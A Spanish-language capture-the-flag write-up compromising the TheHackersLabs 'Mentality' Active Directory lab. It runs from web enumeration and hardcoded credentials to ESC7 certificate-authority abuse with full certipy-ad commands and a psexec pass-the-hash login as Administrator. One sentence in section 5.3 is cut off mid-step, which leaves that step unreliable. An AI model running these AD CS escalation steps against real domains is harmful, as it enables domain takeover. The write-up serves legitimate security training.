
# 🚀 TheHackersLabs — Mentallity [Write Up]

> **🔍 Análisis completo de pentesting sobre un entorno Windows con Active Directory**
> *De reconocimiento inicial a escalada de privilegios como Administrador del dominio*

---

## 📌 **Resumen**
Este *write-up* documenta el **proceso completo de evaluación de seguridad** realizado contra **Mentality**, un laboratorio basado en **Windows Server con Active Directory (AD)**. A través de múltiples vectores de ataque, se logró **comprometer completamente el dominio**, desde la fase de reconocimiento hasta la obtención de **acceso total como Administrador del dominio**.

🔗 **The Hackers Labs**: [thehackerslabs.com](https://thehackerslabs.com)
*Plataforma líder en entrenamiento en ciberseguridad, soluciones empresariales y desafíos prácticos de hacking ético.*

---

## 🔍 **1. Reconocimiento**

### **1.1 Escaneo de Puertos**
Se realizó un **escaneo agresivo** con `nmap` para identificar servicios activos:

```bash
sudo nmap -p- --open -sCV -Pn -n --min-rate 5000 <IP>
```

### **1.2 Servicios Identificados**
Se detectaron los siguientes servicios críticos:

| **Puerto** | **Servicio**                     | **Detalles**                          |
|------------|----------------------------------|----------------------------------------|
| 21         | Microsoft FTP con SSL            | Certificado `VulnFTP`                  |
| 53         | DNS                              | Simple DNS Plus                        |
| 80/8080    | Microsoft IIS 10.0               | Servidor web                           |
| 88         | Kerberos (Active Directory)      | Autenticación del dominio              |
| 135        | Microsoft Windows RPC            | Llamadas a procedimientos remotos     |
| 139/445    | NetBIOS/SMB                      | Compartición de archivos               |
| 389/636    | LDAP/LDAPS (Active Directory)    | Base de datos del directorio           |
| 3268/3269  | Global Catalog LDAP              | Catálogo global del dominio            |
| 5985       | WinRM                            | Administración remota (PowerShell)     |

📌 **Información del Dominio**:
- **Nombre del dominio**: `mentality.thl`
- **Controlador de dominio**: `WIN-9FQTT7GPAVK.mentality.thl`

---

## 🌐 **2. Enumeración Web**

### **2.1 Análisis del Puerto 8080**
Al acceder al puerto **8080**, se identificó una aplicación web titulada **"Mentality"**, con un correo de contacto: `hello@mentality.io`.

### **2.2 Enumeración de Directorios**
Se utilizó `gobuster` para descubrir rutas ocultas:

```bash
gobuster dir -u http://<IP>:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```

🔍 **Resultado**: Se descubrió el directorio `/admin/`.

### **2.3 Panel Administrativo**
Al acceder a `/admin/`, se encontró un **panel de login**. El análisis del código fuente JavaScript reveló credenciales **hardcodeadas**:

```javascript
if (u === "admin" && p === "adminpass123") {
    window.location.href = "dashboard.html";
}
```

🔑 **Credenciales encontradas**:
- **Usuario**: `admin`
- **Contraseña**: `adminpass123`

---

## 💻 **3. Explotación Inicial**

### **3.1 Acceso al Panel Administrativo**
Con las credenciales obtenidas, se accedió al panel, que incluía una funcionalidad de **"System Diagnostics"**.

### **3.2 Obtención de Token**
Al ejecutar "Run diagnostics", se generó un **token en Base64**:

```bash
echo "ZnRwdXNlcjpTdXBlclNlY3JldDEyMyQ=" | base64 -d
```

🔓 **Resultado**: `ftpuser:SuperSecret123$`

---

## 📂 **4. Acceso FTP y Reconocimiento Adicional**

### **4.1 Conexión FTP**
Se estableció conexión FTP con las credenciales obtenidas:

```bash
ftp <IP>
```
- **Usuario**: `ftpuser`
- **Contraseña**: `SuperSecret123$`

### **4.2 Descubrimientos en FTP**
Se encontraron los siguientes archivos:

| **Archivo**                | **Descripción**                     |
|----------------------------|-------------------------------------|
| `flag.txt`                 | **Primera bandera** (user.txt)      |
| `ad_hc_mentality_htl.html` | Reporte de auditoría de PingCastle  |
| `web.config`               | Configuración del servidor web      |

🔍 **Análisis del Reporte PingCastle**:
El archivo `ad_hc_mentality_htl.html` contenía información sensible del dominio. Al analizarlo, se encontraron credenciales adicionales:

🔑 **Credenciales adicionales**:
- **Usuario**: `svcapp1`
- **Contraseña**: `Hola1234$`

---

## ⚡ **5. Escalada de Privilegios via ADCS**

### **5.1 Enumeración de Certificados**
Con las credenciales de `svcapp1`, se enumeraron los servicios de **Active Directory Certificate Services (ADCS)**:

```bash
certipy-ad find -u 'svcapp1' -p 'Hola1234$' -dc-ip 10.0.2.6 -vulnerable -stdout
```

🚨 **Vulnerabilidad detectada**: **ESC7 (Dangerous Permissions on CA)**

### **5.2 Explotación ESC7**
La vulnerabilidad **ESC7** permite abusar de permisos excesivos sobre la **Certificate Authority (CA)** para auto-aprobar certificados.

#### **Pasos de explotación**:

1. **Habilitar plantilla SubCA**:
   ```bash
   certipy-ad ca \
     -u svcapp1@mentality.thl -p 'Hola1234$' \
     -dc-ip 10.0.2.6 \
     -ca mentality-WIN-9FQTT7GPAVK-CA \
     -enable-template SubCA
   ```

2. **Solicitar certificado con UPN de Administrator**:
   ```bash
   certipy-ad req \
     -u svcapp1@mentality.thl -p 'Hola1234$' \
     -dc-ip 10.0.2.6 \
     -ca mentality-WIN-9FQTT7GPAVK-CA \
     -template SubCA \
     -upn Administrator@mentality.thl
   ```

3. **Añadir `svcapp1` como Certificate Manager**:
   ```bash
   certipy-ad ca \
     -u svcapp1@mentality.thl -p 'Hola1234$' \
     -dc-ip 10.0.2.6 \
     -ca mentality-WIN-9FQTT7GPAVK-CA \
     -add-officer svcapp1
   ```

4. **Aprobar la solicitud de certificado**:
   ```bash
   certipy-ad ca \
     -u svcapp1@mentality.thl -p 'Hola1234$' \
     -dc-ip 10.0.2.6 \
     -ca mentality-WIN-9FQTT7GPAVK-CA \
     -issue-request 6
   ```

5. **Descargar el certificado aprobado**:
   ```bash
   certipy-ad req \
     -u svcapp1@mentality.thl -p 'Hola1234$' \
     -dc-ip 10.0.2.6 \
     -ca mentality-WIN-9FQTT7GPAVK-CA \
     -retrieve 6
   ```

### **5.3 Autenticación como Administrator**
Con el certificado `administrator.pfx` obtenido, se realizó autenticación **PKINIT** contra Active usuario Administrator**.

---

## 🏆 **6. Acceso Completo al Sistema**

### **6.1 Conexión con PSExec**
Utilizando el hash NTLM obtenido, se estableció conexión remota como `Administrator`:

```bash
psexec.py -hashes aad3b435b51404...:d04a6bd959f95ce2b2 Administrator@10.0.2.6
```

### **6.2 Obtención de la Bandera Final**
En el directorio `C:\Users\Administrator\Documents`, se encontró la **bandera final (root.txt)**.

---

## 📝 **7. Conclusión**

La evaluación reveló **múltiples vulnerabilidades críticas** que permitieron **comprometer completamente el entorno Active Directory**. La combinación de:
- **Credenciales expuestas** (hardcoded, FTP, AD).
- **Configuraciones inseguras de ADCS** (vulnerabilidad ESC7).
- **Falta de segmentación y permisos excesivos**.

Facilitó una **escalada de privilegios exitosa**, desde un acceso web básico hasta el **control total del dominio como Administrador**.

🔧 **Herramientas utilizadas**:
- `nmap`, `gobuster`, `certipy-ad`, `bloodhound-python`, `psexec.py`, `Evil-WinRM`.

📌 **Lección aprendida**:
> *"La seguridad no es opcional. Configuraciones por defecto, credenciales débiles y permisos excesivos son puertas abiertas para los atacantes."*
